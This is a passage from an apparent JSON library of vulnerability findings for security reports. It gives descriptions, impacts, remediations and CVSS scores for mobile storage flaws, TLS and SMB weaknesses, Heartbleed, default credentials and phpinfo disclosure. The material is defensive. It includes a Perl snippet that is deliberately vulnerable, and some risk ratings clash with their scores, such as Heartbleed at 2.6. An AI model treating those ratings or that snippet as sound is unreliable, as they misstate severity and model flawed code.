server-sided authentication scheme; ideally no sensitive authentication information should be stored on the device (e.g. username, password, or tokens). For highly sensitive applications, the user should be required to log in every time the application is started or opened, depending on the sensitivity level of the data being handled. Any tokens generated through this process should only remain in memory (only while the application is in the foreground, if requiring re-entry of credentials each time the application is opened) and not be persistent (written to disk). For less sensitive applications, tokens generated through the use of a server-side authentication mechanism can be securely stored instead of credentials. In this way, the token can be invalidated by the server after a set time limit, which would render the token on the device useless until a valid user re-authenticates to the application.\n","cvss_base_score":7.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":583,"plugin_id":null,"title":"Sensitive Data in WebView Cache (Android)","type":null,"description":"Sensitive data contained in HTTP and HTTPS responses received by the application is stored on the device in an unencrypted form. By default, WebView caches HTTP and HTTPS responses on the device for an indeterminate amount of time unless the response contains a cache-related header that instructs it not to.\nThis can be exploited in two ways, depending on whether the attacker is local or remote. A local attacker with root access to the device can view the cache's contents directly, for example, by navigating the file system. A remote attacker would have to exploit a separate vulnerability in the application, such as command injection or directory traversal, in order to obtain the cache.\n","poc":null,"impact":"The presence of sensitive data in the WebView cache may result in data leakage from the application. This could allow an attacker to obtain private user information or more effectively target attacks against the application.\n","remediation":"The server should specify the \"Cache-Control: no-cache, no-store\" header in all responses containing sensitive data. When the server's responses cannot be modified - for example, when the server is controlled by a third-party - the mobile application should clear its cache after receiving each sensitive response.\n","cvss_base_score":4.7,"cvss_temporal_score":3.9,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":584,"plugin_id":null,"title":"Credential Kept in Memory After Login","type":null,"description":"The application fails to properly clear a user's credentials from memory after a successful authentication attempt on device.  Credentials may end up being stored for extended periods of time within memory for a variety of reasons. The most common reason for credentials persisting in memory is due to application failing to properly clean up the text inputs associated with the login view controller.  Furthermore, credentials can persist within memory if the application creates the username and password. Note a rooted device will be required as it will permit an attacker to have the necessary privileges to access the application's memory space.\n","poc":null,"impact":"A user's credentials may be compromised as the application fails to properly clear a user's credentials from memory after a successful authentication attempt on device. User's credentials stored in memory may include usernames, passwords, OAUTH tokens, passcodes, as well as tokens. By not clearing the credentials from memory an attacker may gain access to this data resulting in a compromise of the user's account.\n","remediation":"During authentication, the credentials handled by the application must exist in memory for the shortest period of time possible, and then should be immediately discarded once they are no longer needed. After a successful authentication attempt, there is never a need to keep the password persistent in memory. To do this the application should ensure the credentials entered by an end user are cleared from memory once sent to the server by the code controlling the view lifecycle for the login process. Additionally the application should avoid the creation of any object that contains a user's username and password.\n","cvss_base_score":4,"cvss_temporal_score":3,"cvss_vector":"(AV:L/AC:H/Au:N/C:C/I:N/A:N/E:U/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":585,"plugin_id":null,"title":"Sensitive Data Stored Unencrypted in NSUserDefaults Plist (iOS)","type":null,"description":"Sensitive data is stored in the NSUserDefaults plist in an unencrypted state. NSUserDefaults is meant to store values used for generating the default setup for the application. For example, if the application allowed multiple background images or themes, the theme that a user selects should be stored in the defaults. Data is stored in a property list (plist) file as plaintext in the application sandbox. The NSUserDefaults plist is only protected by being placed in the application sandbox, as the operating system does not have the ability to protect the data through encryption or any other method. Furthermore, on a jailbroken device the application sandbox is completely accessible to an attacker, providing no protections to any data stored within it.\n","poc":null,"impact":"The NSUserDefaults plist is a convenient location where applications store various kinds of data. Sensitive data placed in this directory may likely be stored in an unencrypted format. An attacker with direct access to the NSUserDefaults plist may gain access to the stored data, leading to a compromise of user accounts, account information, as well as personal identifiable information.\n","remediation":"Avoid storing data in local storage unless it is necessary. Sensitive data that must be stored on the device's file system should be encrypted by the application. The key used to encrypt the required encryption key should be generated from the user's password using a key derivation function. Key derivation functions, such as PBKDF2 and bcrypt, allow for keys to be created by executing multiple pseudorandom functions (e.g. cryptographic hashes, HMAC) on a provided input along with a salt value. The use of a salt value in a key derivation function reduces the usefulness of precompiled hashes while making the process extreme costly for attackers. The use of a separate encryption key requires the following workflow:\n--The user enters their credentials into the application.\n--The application derives a key from these credentials.\n--The application encrypts its own encryption key using the derived key.\n--The application stores the newly encrypted key in the iOS keychain.\n\nAdditionally backend databases used by the application can be encrypted to prevent data leakage. For encrypting databases, libraries such as SQLCipher should be used to ensure the data is protected on the device.\n","cvss_base_score":4.7,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":586,"plugin_id":null,"title":"Symbol Information Available (iOS)","type":null,"description":"The application's binary code contains symbol information that reveals details about the application's structure and operation. For example, function and variable names can indicate the purpose of a particular section of code. The attacker can use this information to target high-value areas of the application and concentrate resources more effectively during subsequent exploitation attempts.\n","poc":null,"impact":"Symbol information in the application's binary code makes it easier for the attacker to reverse engineer the application, a process that can facilitate the discovery of other vulnerabilities.\n","remediation":"The application should be built without symbol information. The Xcode project's build settings should be changed as follows:\n--Set \"Additional Strip Flag\" to \"-S --x\".\n--Set \"Strip Debug Symbols During Copy for Release\" to \"Yes\".\n--Set \"Strip Linked Product\" to \"Yes\".\n--Set \"Strip Symbol Style\" to \"All Symbols\".\n\n","cvss_base_score":6.9,"cvss_temporal_score":6,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:C/A:C/E:ND/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":587,"plugin_id":null,"title":"Debug Logging Enabled","type":null,"description":"Debug logs are created by the application at runtime. Debug-level logs may contain a variety of information regarding the execution of the application, such as error conditions and file locations, or personally identifiable information. Debug logs can be written to files or the standard output or error stream.\nWhen the attacker has access to a victim's device that is rooted or jail-broken, the attacker can examine the logs for sensitive data (e.g. user credentials, credit card numbers) that the victim previously entered. Additionally, the attacker can install and run the application on their device to observe the data that is logged in order to determine internal application details that may facilitate a subsequent attack.\n","poc":null,"impact":"The presence of debug-level logs on the device may result in the leakage of sensitive information. The debug information found in the logs could contain personally identifiable information (e.g. user credentials, credit card numbers), server endpoints, or internal application details (e.g. class or method names) that facilitate subsequent attacks.\n","remediation":"Disable debug logging in the release build of the application. This includes removing options (such as flags in configuration files) that enable debug logging. Also logging directly to the console should be avoided.\n","cvss_base_score":4.9,"cvss_temporal_score":4.1,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":588,"plugin_id":null,"title":"Automatic Reference Counting (ARC) not enabled (iOS)","type":null,"description":"The application was compiled with automatic reference counting (\"ARC\") disabled, indicating that the application must perform manual reference counting. Manual reference counting is a memory-management technique that is prone to error since the responsibility of retaining or releasing objects falls on the developer. ARC shifts the responsibility of memory management from the developer to the compiler, ensuring that objects live as long as necessary, but no longer. Without it, developers must insert explicit retain and release messages, which must be properly paired and ordered to prevent memory leaks, use-after-free vulnerabilities, and double-free vulnerabilities.","poc":"","impact":"The use of manual reference counting instead of automatic reference counting (\"ARC\") makes it more likely for the application to contain memory management vulnerabilities that an attacker could exploit to cause crashes, arbitrary code execution, or denial of service.","remediation":"ARC is supported and should be enabled during compilation in Xcode 4.2 and above, for iOS 4 and above, and OS X 10.6 and above. Applications should be recompiled using a version of Xcode that supports ARC using one of the following techniques:\nFor new applications, use Xcode's default settings that enable ARC through the use of the -fobjc-arc compiler flag.\nFor existing applications, use Xcode's ARC refactoring tool by choosing \"Edit > Refactor > Convert to Objective-C ARC\" from the menu bar. The specific refactoring process is outside the scope of this report, but is described in Apple's \"Transitioning to ARC Release Notes\" document:\nhttps://developer.apple.com/library/ios/releasenotes/objectivec/rn-transitioningtoarc/Introduction/Introduction.html","cvss_base_score":6.2,"cvss_temporal_score":4.6,"cvss_vector":"(AV:L/AC:H/Au:N/C:C/I:C/A:C/E:U/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2019-01-24 02:21:08","approved":1,"v_likelihood":"Minimal","v_impact":"Low","steps_to_reproduce":"","likelihood_text":""},{"id":589,"plugin_id":null,"title":"Perl: &quot;Use Strict&quot; Not used","type":null,"description":"The code does not use the \"use strict\" pragma provided by Perl. The \"strict\" pragma will affect all \"vars\", \"refs\", as well as \"subs\" in the application. This stricture will first require that all variables be declared before they are used, either with the \"my\" keyword for a lexical variable or the \"our\" keyword for global variables. Also any value that is predefined by Perl, imported from a separate package, or qualified using the package name and the double- colon package separator will be allowed under this stricture. Secondly this stricture will no longer allow symbolic references in the code, since a symbolic reference can only refer to a global variable. Finally this stricture will also mark any barewords used in the code as syntax errors, meaning that all subroutines must be context specific. Without the \"strict\" pragma there is a much greater chance that the code base contains bugs, which can possibly become exploited.\n","poc":null,"impact":"\n","remediation":"Add the \"use strict;\" line to the Perl script before any other statements except additional \"use\", \"package\", and \"require\" statements. Note the strict pragma can be used the following ways to enforced all the strictures or select them individually.\n<pre><code class=\"perl\">use strict; use strict \"refs\"; use strict \"vars\"; use strict \"subs\"; </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":590,"plugin_id":null,"title":"Anonymous SSL/TLS Ciphers Supported","type":null,"description":"The server-side SSL/TLS endpoint is configured to support anonymous cipher suites. Anonymous cipher suites do not involve the client authenticating the server or the server authenticating the client; these cipher suites are only suitable for protecting against passive eavesdropping attacks. Active man-in-the-middle attacks can be used to read/modify data sent between the client and the server.\nAnonymous cipher suites can be identified by the strings DH_Anon (for Anonymous Diffie-Hellman) and ECDH_Anon (for Anonymous Elliptic Curve Diffie-Hellman) in the cipher suite names.\n","poc":null,"impact":"Anonymous SSL/TLS cipher suites do not allow the client to authenticate the server or the server to authenticate the client. SSL/TLS connections made using these cipher suites are not secure against active attackers who can use man-in-the-middle attacks to read/modify data sent between the client and the server.\n","remediation":"The server-side SSL/TLS endpoint's configuration should be updated to allow only TLSv1.2 connections with cipher suites that use:\n--Ephemeral Diffie-Hellman for key exchange (optionally, allow RSA for key exchange if necessary for supporting some clients)\n--Block ciphers with key lengths of at least 128 bits (AES-128 and AES-256; optionally allow 3DES with 112-bit keys if necessary for supporting some clients)\n--Block ciphers in GCM mode (optionally, allow block ciphers in CBC mode if necessary for supporting some clients)\n--The SHA2 family of hash functions (SHA256, SHA384, SHA512) for block ciphers in CBC mode if necessary; optionally, allow SHA1 if necessary for supporting some clients\n\n","cvss_base_score":2.6,"cvss_temporal_score":2,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:POC/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":591,"plugin_id":null,"title":"Apache HttpOnly Cookie Information Disclosure","type":null,"description":"The remote server is running a version of Apache that does not safely handle long HTTP headers. If no custom HTTP 400 (Bad Request) error page is configured, Apache will return a default error page when it receives a request containing header values greater than 4000 characters. In versions of Apache prior to 2.2.21, the default error page includes the current server value of the header sent with an overlong value in the initial request.\n","poc":null,"impact":"Combined with an unrelated cross-site scripting vulnerability, this design can be abused by injecting a script into a page served to a victim when a request is made to the server with over-long values set for headers the attacker wishes to obtain. The server returns the default error page, containing the values of the invalid headers stored on the server. The script then sends the exposed information to a server the attacker controls.\nThis flaw in Apache allows an attacker to obtain sensitive information passed via headers, regardless of any other protections in place (including cookies with the HttpOnly flag set). Information such as session identifiers passed via cookies can be leaked, allowing an attacker to impersonate other users.\n","remediation":"Upgrade Apache to version 2.2.22 or later; alternatively, or in conjunction with upgrading, create a custom error page for HTTP 400 Bad Request that does not reveal application details.\n","cvss_base_score":4.3,"cvss_temporal_score":3.6,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":592,"plugin_id":null,"title":"Default Credentials","type":null,"description":"Network services were discovered that are configured for access using default credentials. Default credentials are well-known public default usernames and/or passwords for software or appliances. These credentials are often put in place for one of a few reasons:\n--Default credentials may be set to allow administrators to login for the first time and configure the service or appliance.\n--In some cases, a common default password is set when a new account is created and the user is not forced to change the initial password on first authentication.\n--Some applications set a single, known password for newly created accounts.\n--Developers may leave hard-coded test accounts in code which are not removed prior to the software's release.\n\n","poc":null,"impact":"Because default credentials are usually publicly available knowledge they provide an easy means for attackers to gain control of a service or appliance. A service that uses a set of default credentials may allow for an attacker to modify configuration settings, create new user accounts, disable servers, or destroy application logs in an effort to hide their presence.\n","remediation":"Change the default username to a unique value if possible, and change the password to any strong password string. Suggestions for a strong password are a string that meets the following requirements:\n--Passwords must be at least nine (9) characters long.\n--Passwords must contain some combination of at least three (3) of the following classes of characters: lowercase, uppercase, numeric, and \"special\" (e.g., !, @, #, $, %, ^, etc.) characters.\n--Passwords should not be a dictionary word in any language, slang, dialect, jargon, etc. \n--Passwords should not be based on personal information, etc.\n\n","cvss_base_score":7.5,"cvss_temporal_score":6.8,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:P/A:P/E:F/RL:W/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":593,"plugin_id":null,"title":"F5 BIG-IP Cookie Information Disclosure","type":null,"description":"The F5 BIG-IP load balancer is configured to encode and send certain details about the web server it is acting on behalf of to the user in a cookie ('BIGipServer'). The encoded cookie data may include the web server's hostname, IP address and port number. Although this information is encoded in the cookie value, it isn't encrypted and hence can be easily decoded by end users. Moreover, this cookie is persistent and hence will show the same contents no matter how many times you make a new connection.\n","poc":null,"impact":"Malicious users can decode the value of the BIG-IP cookie to reveal both the internal IP and the host name of the remote server, exposing information related to the web server and as well as an organization's internal network. Knowing specific IP addresses and overall IP address schemes will reduce an attacker's reconnaissance time and assist in more efficiently crafting targeted attacks against the organization's internal network.\n","remediation":"Configure the BIG-IP LTM system to encrypt HTTP cookies before sending them to the client system. The BIG-IP LTM system can encrypt BIG-IP persistence cookies as well as cookies that are embedded in the response from the server.\nWhen cookie encryption is enabled, the BIG-IP LTM system extracts the unencrypted cookie from the server response, encrypts it using a 192-bit AES cipher, and then encodes it using the Base64 encoding scheme. The BIG-IP LTM system then embeds the encrypted cookie into the HTTP response sent to the client. On subsequent requests, when the client presents the encrypted cookie to the BIG-IP LTM system, BIG-IP LTM removes the cookie, decodes it using the Base64 encoding scheme, and decrypts it. The BIG-IP LTM system then re-embeds the decrypted cookie in the HTTP request to the server.\nFurther details on the remediation guidance may be found at:\nhttps://support.f5.com/kb/en-us/solutions/public/14000/700/sol14784.html\n","cvss_base_score":5,"cvss_temporal_score":4.1,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:N/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":594,"plugin_id":null,"title":"Service Permits Cleartext Logins and Transfers","type":null,"description":"The remote computer has network services enabled which send and receive information in plaintext. The information sent and received may include confidential information sent as part of a transaction or user credentials sent during the login process. Many services by default send information unencrypted as they expect to be used in concert with an encryption protocol such as SSL/TLS or IPSEC. A non-exhaustive list of common services that send sensitive information in plaintext includes Telnet, FTP, SMTP, HTTP, SMTP, and POP3.\n","poc":null,"impact":"Sending credentials or other information over the network using plaintext protocols leaves them vulnerable to traffic sniffing and man-in-the-middle (MiTM) attacks. This can lead to unauthorized access to sensitive data as well as user impersonation in the event that account credentials are intercepted.\nThese types of attacks most often occur when the attacker is on the same network as the victim, although it is possible to perform similar attacks across the Internet. The level of resources required and sophistication of the attacker increases dramatically when an attack of this scale is performed.\n","remediation":"Configure all external and internal network devices and services supporting sensitive information to utilize an encrypted protocol for authentication and transmission of data. Configure services and devices to encrypt their network traffic with SSL/TLS, SSH, or IPSEC. If the service natively supports some form of traffic encryption, enable that feature of the service. A common example of encrypting basic network service traffic is the use of HTTPS (SSL/TLS) to encrypt standard HTTP traffic.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":595,"plugin_id":null,"title":"External Windows Services","type":null,"description":"The server contains running Windows services with known weaknesses which are accessible by entities on the open Internet. External Windows services refer to windows services such as MS Remote Desktop Protocol (RDP), Windows print sharing, or other services with known weaknesses. Externally accessible windows services are generally caused by host-based and/or network-based firewall misconfigurations. These misconfigurations allow access to the service from devices outside the local domain.\n","poc":null,"impact":"Internal Windows services left accessible to the external Internet may be exploited by an attacker to access sensitive internal operations, equipment, or information.\n","remediation":"Configure the local host firewall and/or network firewalls to block access to the Windows service from all IPs, both internal and external, that do not specifically require access to the externally accessible service. If the Windows service is not required for standard operations, disable the service via either group policy or the Windows 'Services' management tool.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:S/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":596,"plugin_id":null,"title":"Share with Open Read Permissions","type":null,"description":"A network share with open \"read\" permissions was discovered; this file share is globally readable by any user, authenticated or otherwise. Network file share technologies (e.g. NFS, AFS, CIFS) all provide access control technologies to limit the reading, writing, and viewing of file shares. Access control lists allow access limits to be set on specific users, groups, and all others not explicitly specified (e.g., the 'Everyone' group on Microsoft Windows). Shares with open \"read\" permissions are a result of an administrator providing read access to unauthenticated users. In POSIX, this is equivalent to allowing the 'other' portion of the ACL to have read privileges. In Microsoft Windows, this is equivalent to providing the \"Everyone\" group with \"read\" privileges.\n","poc":null,"impact":"Any confidential or highly restricted information stored on file shares with open read permissions may be accessed by internal and external attackers with access to the network. File shares may contain documents with corporate, customer, or employee information. An attacker with access to this information can sell, distribute, or use it to compromise the organization's customers, employees, or internal assets.\n","remediation":"Limit access to the effected file share such that only the required sets of users and groups have access. Read access should not be granted to unauthenticated users (specifically, members of the 'Everyone' group on Windows and the 'other' group on systems that use POSIX access control lists).\n","cvss_base_score":5,"cvss_temporal_score":4.1,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:N/A:N/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:13","updated_at":"2018-11-12 09:25:13","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":597,"plugin_id":null,"title":"OpenSSL Memory Buffer Over-read (Heartbleed)","type":null,"description":"The remote server is running a version of the OpenSSL cryptographic library that is vulnerable to 'Heartbleed' (CVE-2014-0160), which allows an attacker to extract data from the server's memory. OpenSSL versions 1.0.1 through 1.0.1f (inclusive) are vulnerable unless they were compiled with the uncommon -DOPENSSL_NO_HEARTBEATS option.\nOpenSSL is vulnerable to Heartbleed due to a bug in its implementation of an extension to SSL/TLS known as a heartbeat. This extension provides an efficient way for the client to determine whether the server is still listening by sending a \"heartbeat request.\" If the listener supports the extension, it responds with a \"heartbeat response.\" Incorrect memory allocation code in OpenSSL allows an attacker to craft a heartbeat request that causes the server to read process memory from outside the intended bounds and send its contents back to the attacker as the heartbeat response. This attack leaves no evidence in the server's logs, making it impossible to determine whether the server was compromised. The underlying vulnerability was fixed by adding bounds checks in the appropriate locations.\n","poc":null,"impact":"Accessing the server's memory may allow an attacker to obtain sensitive data. Depending on the server's functionality and the memory segment exposed, this data can include the server's private SSL/TLS key, application or user credentials, session identifiers, and personal information.\nObtaining the server's private SSL/TLS key allows the attacker to impersonate the server and decrypt all communications to the server via a man-in-the-middle attack, enabling the attacker to obtain other sensitive information and perform unauthorized actions on behalf of the user. Obtaining the private key also allows the attacker to retroactively decrypt recorded past communications that were made with the same private key.\nObtaining session identifiers, even if user credentials are not leaked, allows the attacker to perform a session hijacking attack in order to impersonate the user while the session is still active.\n","remediation":"In order to prevent sensitive data leakage through Heartbleed, upgrade to the latest stable version of OpenSSL. The earliest version that is not vulnerable to Heartbleed is 1.0.1g. Once this is done, revoke and reissue all impacted X.509 certificates, expire all user sessions, and force all users to reset their passwords.\n","cvss_base_score":2.6,"cvss_temporal_score":1.9,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":598,"plugin_id":null,"title":"Vulnerable Software Version","type":null,"description":"The version of the software service in use has known, published vulnerabilities.\n","poc":null,"impact":"Published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools. Depending on the nature of these vulnerabilities, this could allow an attacker to compromise the server and any data stored within.\n","remediation":"Upgrade or patch the software service to a version which does not currently have any known vulnerabilities. Furthermore, as soon as it is identified that the service version is vulnerable to an attack, preventative measures should be taken to mitigate the vulnerability until an upgrade or patch is released.\n","cvss_base_score":4.3,"cvss_temporal_score":3.7,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N/E:U/RL:ND/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":599,"plugin_id":null,"title":"SMB Signing Disabled","type":null,"description":"SMB signing is disabled or is not enforced on the host, potentially exposing data to eavesdropping attacks in transit. SMB signing is a protocol feature used to sign SMB packets so that the client and server know that they are communicating directly to one another without any data interception and re-transmission by an attacker sitting between the client and server. When this setting is enforced (required), a client is required to support SMB signing in order to connect. Once a client connects to the server, all server message block data sent between the systems will be signed by both the client and the server, so both systems can verify the authenticity of the data being transmitted by the other system. This feature has been available for Windows clients since Windows NT 4 SP3.","poc":"","impact":"Due to SMB signing being disabled, man-in-the-middle attacks against this system are possible, exposing any sensitive data being transmitted over the network. An attacker could exploit this by performing an SMB relay attack, which waits for authentication attempts from a highly privileged account and redirects them to the affected system. Once the redirected authorization attempt succeeds, the affected system will think that the attacker's system is authorized because of the privileged account being used in the attack. If SMB signing were enabled, this type of SMB relay attack would fail.","remediation":"Enforce SMB signing on the server via Local Policies or globally using Group Policy. Simply allowing SMB signing, but not mandating its use will not fully mitigate this vulnerability, so it must be mandatory. Use the group policy setting in the following guide to mandate SMB packet signing:\n<pre>https://technet.microsoft.com/en-us/library/Cc786681(v=WS.10).aspx</pre>","cvss_base_score":5,"cvss_temporal_score":3.7,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:P/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2019-01-24 02:15:45","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":"","likelihood_text":""},{"id":600,"plugin_id":null,"title":"Perl: Subroutine Does Not End With Return","type":null,"description":"Several subroutines are not explicitly terminated. Subroutines that lack explicit return statements at the end can potentially cause data to leak from the subroutine into the rest of the program, as seen the the example below:\n<pre><code class=\"perl\">package Password; # every time the user guesses the password wrong, its value # is rotated by one character my $password; sub set_password { $password = shift; } sub check_password { my $guess = shift; if ($guess eq $password) { unlock_secrets(); } else { $password = (substr $password, 1).(substr $password, 0, 1); } } </pre>\nWithout a return at the end of this subroutine, the last assignment becomes the default return value and in this case an incorrect password guess will still return the valid password.\n","poc":null,"impact":"\n","remediation":"Require all subroutines to terminate explicitly with one of the following: \"return\", \"carp\", \"croak\", \"die\", \"exec\", \"exit\", or \"throw\". Note the only exception to this remediation is when the subroutine is empty.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":601,"plugin_id":null,"title":"PHP Info Page Information Disclosure","type":null,"description":"The application leaks detailed information about the web server and PHP configuration. Information is disclosed to users by displaying information returned from the \"phpinfo()\" function on user-accessible pages. The \"phpinfo()\" function returns information regarding the PHP installation which includes (but is not limited to): who installed PHP and if they have sudo, the IP address of the server, the version of the operating system, the version of the web server, the directory of the web server, and information about what options were included in the PHP installation.\n","poc":null,"impact":"Pages containing output from the \"phpinfo()\" function may leak sensitive information about the application's PHP configuration and overall technology stack. An attacker could use this information to more efficiently discover known vulnerabilities in these components and create targeted attacks against the application.\n","remediation":"Remove all calls to \"phpinfo()\" from PHP scripts before moving the application into production.\n","cvss_base_score":5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"High","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":602,"plugin_id":null,"title":"Out of Date Software","type":null,"description":"The server is running software which is behind the current stable version. Such software often contains vulnerabilities and broken functionality which may or may not have been discovered or published.\n","poc":null,"impact":"It is often trivial for an attacker to research and exploit vulnerabilities in software that have been discovered and published. In addition, known vulnerability exploits are often built into automated tools, further reducing the skill an attacker would need to conduct such attacks.\n","remediation":"Upgrade or patch the software to the current stable version. A responsible patch management system should be put in place to keep software up to date without disrupting service.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 